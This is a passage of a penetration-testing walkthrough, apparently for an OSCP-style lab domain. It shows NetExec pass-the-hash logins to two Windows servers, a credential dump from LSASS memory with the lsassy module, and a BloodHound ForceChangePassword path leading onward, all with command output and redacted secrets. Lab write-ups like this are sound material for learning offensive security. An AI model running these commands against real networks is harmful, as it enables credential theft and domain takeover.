# 08 — Local Administrator, then LSASS

The hash from the backup is a local credential, so the first thing it buys is the machine it came
from: `172.16.97.202` accepts `Administrator` with `--local-auth` and nothing else changes in the
domain. That is the entry the first pass never found.

## 8.1 Pass-the-hash against the second server

```bash
nxc smb 172.16.97.202 -u Administrator -H '[redacted]' -d oscp.exam --local-auth
```

```text
SMB         172.16.97.202   445    [redacted]    [*] Windows Server 2019 Build 17763 x64 (name:[redacted]) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         172.16.97.202   445    [redacted]    [+] [redacted]\Administrator:[redacted] (Pwn3d!)
```

`(Pwn3d!)` on a member server means local administrator, which is all that is needed for the next
move. No shell is required: the interesting material is in memory, and NetExec can read it over SMB.

## 8.2 The same password is on the domain controller

The set was built from one image, and the local `Administrator` password is reused. Pointing the same
hash at `SRV22` therefore authenticates there as well — `--local-auth` is checked against the
machine's own SAM:

```bash
nxc smb 172.16.97.200 -u Administrator -H '[redacted]' -d oscp.exam --local-auth -M lsassy
```

```text
SMB         172.16.97.200   445    SRV22    [*] Windows Server 2022 Build 20348 x64 (name:SRV22) (domain:SRV22) (signing:True) (SMBv1:None)
SMB         172.16.97.200   445    SRV22    [+] SRV22\Administrator:[redacted] (Pwn3d!)
SMB         172.16.97.200   445    SRV22    [*] lsassy
SMB         172.16.97.200   445    SRV22    OSCP.EXAM\A.NEWMAN:[redacted]
```

The `lsassy` module is the interesting half. It does not crack anything: it uploads a small dumper,
opens `lsass.exe` with the local administrator rights that were just obtained, and asks for
`sekurlsa::logonpasswords` in memory. Whatever was logged on to that server interactively is in the
answer in clear text.

`A.NEWMAN` was one of those logons. A domain account with a session on `SRV22` is exactly the account
BloodHound had already flagged in the first pass.

## 8.3 Why this account, and not the Administrator hash

`SRV22\Administrator` with `--local-auth` is local administrator on the domain controller — enough to
read a desktop, not enough to be Domain Admin. `A.NEWMAN` is a domain identity, and the directory
grants it a specific right over a specific account:

```text
A.NEWMAN  ──ForceChangePassword──▶  A.BETTY
```

That edge, collected with BloodHound in the first pass, is what the clear-text password unlocks. The
next chapter is two commands long.
